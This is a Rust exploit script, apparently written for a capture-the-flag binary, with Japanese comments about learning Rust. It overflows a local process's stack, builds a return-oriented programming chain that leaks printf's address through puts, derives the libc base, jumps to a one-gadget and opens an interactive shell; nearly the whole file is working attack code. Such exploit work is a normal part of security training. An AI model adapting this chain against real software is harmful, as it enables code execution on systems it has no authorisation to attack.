use clap::Clap;
use pwntools::util::P64;
use pwntools::{process::Process, pwn::*};
use std::convert::TryInto;
use std::io;

#[derive(Clap)]
struct Opts {
    elf_file: String,
    libc_file: String,
}

fn main() -> io::Result<()> {
    let opts: Opts = Opts::parse();
    println!("{}", opts.elf_file);

    let scanf_plt_addr: u64 = 0x00400680;

    let elf = Pwn::new(&opts.elf_file);
    let libc = Pwn::new(&opts.libc_file);
    let mut s = Process::new(&opts.elf_file)?;
    s.sendline(&b"-33 6")?;
    s.sendline(&b"3")?;
    // println!(s.recvuntil("Do you want to report the problem?\n> "));
    s.send(&b"\0".repeat(32))?;
    s.send(&P64(0xdeadbeef))?;

    const POP_RDI: u64 = 0x4011d3;
    const POP_RSI_R15: u64 = 0x004011d1;

    s.send(&P64(POP_RDI))?;
    s.send(&P64(elf.got("printf").unwrap()))?;
    // s.send(P64(elf.plt("puts"))) ここなんか定数じゃないとだめなんや
    const PUTS_PLT: u64 = 0x0040063;
    s.send(&P64(PUTS_PLT))?;

    const WRITABLE_REGION: u64 = 0x602100;
    s.send(&P64(POP_RSI_R15))?;
    s.send(&P64(WRITABLE_REGION))?;
    s.send(&P64(0xdeadbeef))?;

    // set rdi to '%s'
    s.send(&P64(POP_RDI))?;
    const PERCENT_S: u64 = 0x4013e6;
    s.send(&P64(PERCENT_S))?;

    // Align RSP to 16 bytes
    const RET: u64 = 0x00400606;
    s.send(&P64(RET))?;

    s.send(&P64(scanf_plt_addr))?;

    const POP_RBX_RBP_R12_R13_R14_R15_RET: u64 = 0x004011ca;
    s.send(&P64(POP_RBX_RBP_R12_R13_R14_R15_RET))?;
    s.send(&P64(1))?;
    s.send(&P64(0))?;
    s.send(&P64(WRITABLE_REGION))?;
    s.send(&P64(0))?;
    s.send(&P64(0))?;
    s.send(&P64(0))?;

    const CALL: u64 = 0x004011b9; // [r12 + rbx*8]
    s.send(&P64(CALL))?;
    s.send(&b"\0".repeat(0x50))?;

    s.sendline(&b"")?;

    // todo!("ここから recvline実装");

    // --------------------------------
    // x = s.recvline().split(b'\n')[0]
    // while len(x) < 8:
    //     x += b'\x00'
    // printf_addr = unpack('Q', x)[0]
    // print('printf: 0x%x' % printf_addr)

    // https://doc.rust-lang.org/std/primitive.slice.html#method.strip_suffix

    let mut x = s.recvline()?.strip_suffix(b"\n").unwrap().to_vec();
    x.resize(8, b'\x00');
    let printf_addr = u64::from_le_bytes(x.try_into().unwrap());
    println!("{:?}", printf_addr);

    const LIBC_GADGET_OFFSET: u64 = 0xe6c7e;
    // const LIBC_GADGET_OFFSET: u64 = 0x4f432;
    let libc_base_addr = printf_addr - libc.symbol("printf").unwrap();
    let gadget_addr = libc_base_addr + LIBC_GADGET_OFFSET;

    s.send(&P64(0))?;
    s.send(&P64(gadget_addr))?;
    s.sendline(&b"")?;
    s.interactive()?;

    // collectはFromIteratorを実装している任意の型 (通常はコンテナっぽい型) に変換できる
    // VecにしたいのかHashMapにしたいのかHashSetにしたいのかBTreeMapにしたいのかコンパイラは知らないので
    // collectするときはだいたいtype annotationが必要 (もっと型推論頑張ってくれ)
    // type annotationのしかたとしては
    // let foo: Vec<_> = (...).collect(); みたいに束縛に書く方法と
    // (...).collect::<Vec<_>>() みたいに書く方法がある (turbofish構文)
    // 後者だと (...).collect::<Vec<_>>().(...) みたいなmethod chainの途中で使える
    // 僕は型推論が上手くいくことを祈って、ダメならturbofishしてます

    // --------------------------------

    // println!("{:?}", elf.got("printf"));
    // println!("{:?}", elf.got("__isoc99_scanf"));

    // println!("{:?}", libc.symbol("printf"));

    Ok(())
}
